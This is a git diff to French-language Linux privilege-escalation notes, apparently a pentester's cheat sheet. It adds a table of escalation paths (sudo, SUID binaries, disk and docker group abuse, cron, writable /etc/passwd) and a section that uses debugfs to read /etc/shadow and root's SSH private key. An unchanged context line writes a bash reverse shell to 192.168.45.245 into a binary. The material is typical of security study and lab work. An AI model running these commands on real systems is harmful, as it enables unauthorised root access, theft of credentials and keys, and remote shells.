@@ -1,5 +1,16 @@
 # Linux
 
+## Chemins Courants
+
+| Check | Commande | Escalade |
+| :--- | :--- | :--- |
+| sudo -l | `sudo -l` | GTFOBins |
+| SUID binaries | `find / -perm -4000 2>/dev/null` | GTFOBins / Exploit custom |
+| Groupe : disk | `id` | `debugfs /dev/sda1` |
+| Groupe : docker | `id` | `docker run -v /:/mnt --rm -it alpine chroot /mnt bash` |
+| Cron jobs | `cat /etc/crontab` | Script writable / Path hijack |
+| /etc/passwd writable | `ls -la /etc/passwd` | Ajouter utilisateur root |
+
 ## Tips
 
 Toujours fouiller dans `/opt` et `/home`
@@ -424,4 +435,17 @@ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o pspy64s .
 python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS' 
 
 echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.245/443 0>&1'" > /opt/aerospike/bin/asadm
+```
+
+## Disk Group Abuse
+
+```shell
+# Lister les partitions
+df -h
+lsblk
+
+# Accéder au disque en root
+debugfs /dev/sda1
+> cat /etc/shadow
+> cat /root/.ssh/id_rsa
 ```
